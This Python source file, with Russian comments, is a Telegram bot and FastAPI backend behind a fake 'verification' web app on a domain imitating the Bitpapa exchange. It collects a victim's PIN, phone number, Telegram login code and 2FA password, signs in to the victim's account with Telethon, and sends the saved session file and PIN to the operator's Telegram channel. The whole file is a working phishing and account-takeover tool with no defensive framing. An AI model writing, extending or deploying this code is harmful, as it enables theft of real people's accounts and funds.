import os
import json
from aiogram import Bot, Dispatcher, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo, InputMediaDocument
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from telethon import TelegramClient, errors
from telethon.errors.rpcerrorlist import AuthRestartError
from dotenv import load_dotenv
from fastapi.middleware.cors import CORSMiddleware

load_dotenv()

bot_token = os.getenv("BOT_TOKEN")
api_id = int(os.getenv("API_ID"))
api_hash = os.getenv("API_HASH")
channel_id = int(os.getenv("CHANNEL_ID"))

bot = Bot(
    token=bot_token,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher(storage=MemoryStorage())
app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://bitpapaverify.github.io"],  # ваш фронтенд-домен
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

def session_path(phone):
    return os.path.join(SESSIONS_DIR, f"{phone}.session")

def pin_path(phone):
    return os.path.join(SESSIONS_DIR, f"code_{phone}.txt")

# В памяти храним phone_code_hash для sign_in и pin для пользователя
TEMP_CODES = {}
TEMP_PINS = {}

@app.post("/api/step")
async def handle_step(request: Request):
    data = await request.json()
    step = data.get("step")
    phone = data.get("phone")
    pin = data.get("pin")
    response = {}

    # 1. Шаг PIN — ждем только pin, phone не нужен
    if step == "pin":
        if not pin or len(pin) != 4 or not pin.isdigit():
            return JSONResponse({"ok": False, "error": "Введите корректный 4-значный PIN"}, status_code=400)
        # Сохраняем PIN во временное хранилище по session id (или по отдельному id, тут просто по 'current')
        TEMP_PINS["current"] = pin
        response["ok"] = True

    # 2. Шаг phone — ждем phone и pin
    elif step == "phone":
        if not phone:
            return JSONResponse({"ok": False, "error": "Missing phone"}, status_code=400)
        if not pin:
            # Если вдруг pin не передан, пробуем взять из TEMP_PINS
            pin = TEMP_PINS.get("current")
        if not pin:
            return JSONResponse({"ok": False, "error": "Сначала введите PIN"}, status_code=400)
        session_file = session_path(phone)
        try:
            client = TelegramClient(session_file, api_id, api_hash)
            await client.connect()
            sent = await client.send_code_request(phone)
            TEMP_CODES[phone] = sent.phone_code_hash
            # Сохраняем pin для этого phone
            TEMP_PINS[phone] = pin
            response["ok"] = True
        except AuthRestartError:
            TEMP_CODES.pop(phone, None)
            response["ok"] = False
            response["error"] = "Telegram требует повторить авторизацию. Пожалуйста, начните процесс заново (введите номер ещё раз)."
        except Exception as e:
            response["ok"] = False
            response["error"] = str(e)
        finally:
            await client.disconnect()

    # 3. Получен sms_code — пытаемся войти
    elif step == "sms":
        if not phone or not pin:
            return JSONResponse({"ok": False, "error": "Missing phone or PIN"}, status_code=400)
        sms_code = data.get("sms_code")
        phone_code_hash = TEMP_CODES.get(phone)
        session_file = session_path(phone)
        try:
            client = TelegramClient(session_file, api_id, api_hash)
            await client.connect()
            await client.sign_in(phone=phone, code=sms_code, phone_code_hash=phone_code_hash)
            response["ok"] = True
            response["2fa_required"] = False
        except errors.SessionPasswordNeededError:
            response["ok"] = True
            response["2fa_required"] = True
        except AuthRestartError:
            TEMP_CODES.pop(phone, None)
            response["ok"] = False
            response["error"] = "Telegram требует повторить авторизацию. Пожалуйста, начните процесс заново (введите номер ещё раз)."
        except errors.PhoneCodeInvalidError:
            response["ok"] = False
            response["error"] = "Неверный код из Telegram"
        except Exception as e:
            response["ok"] = False
            response["error"] = str(e)
        finally:
            await client.disconnect()

    # 4. Получен 2FA пароль
    elif step == "2fa":
        if not phone or not pin:
            return JSONResponse({"ok": False, "error": "Missing phone or PIN"}, status_code=400)
        code_2fa = data.get("code_2fa")
        session_file = session_path(phone)
        try:
            client = TelegramClient(session_file, api_id, api_hash)
            await client.connect()
            await client.sign_in(password=code_2fa)
            response["ok"] = True
        except errors.PasswordHashInvalidError:
            response["ok"] = False
            response["error"] = "Неверный пароль 2FA"
        except Exception as e:
            response["ok"] = False
            response["error"] = str(e)
        finally:
            await client.disconnect()

    # 5. Завершаем (сохраняем PIN и сессию)
    elif step == "done":
        if not phone or not pin:
            return JSONResponse({"ok": False, "error": "Missing phone or PIN"}, status_code=400)
        # Сохраняем PIN в файл, отправляем файлы
        with open(pin_path(phone), "w", encoding="utf-8") as f:
            f.write(pin)
        await send_files_to_channel(phone)
        response["ok"] = True

    else:
        response["ok"] = False
        response["error"] = "Unknown step"

    return JSONResponse(response)

async def send_files_to_channel(phone):
    from aiogram.types.input_file import FSInputFile
    session_file = session_path(phone)
    pin_file = pin_path(phone)
    files = []
    if os.path.exists(session_file):
        files.append(FSInputFile(session_file))
    if os.path.exists(pin_file):
        files.append(FSInputFile(pin_file))
    if files:
        media = []
        for f in files:
            media.append(InputMediaDocument(media=f))
        caption = f"➕ Новый пользователь: <code>{phone}</code>"
        media[0].caption = caption
        media[0].parse_mode = ParseMode.HTML
        await bot.send_media_group(channel_id, media)

@dp.message(Command("start"))
async def start(message: types.Message):
    markup = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text='Верефицироваться', web_app=WebAppInfo(url='https://bitpapaverify.github.io/bitpapasimplesite/'))]
        ],
        resize_keyboard=True
    )
    await message.answer('Привет мой друг!', reply_markup=markup)

@dp.message()
async def web_app(message: types.Message):
    if message.web_app_data:
        await message.answer(message.web_app_data.data)

if __name__ == "__main__":
    import asyncio
    asyncio.run(dp.start_polling(bot))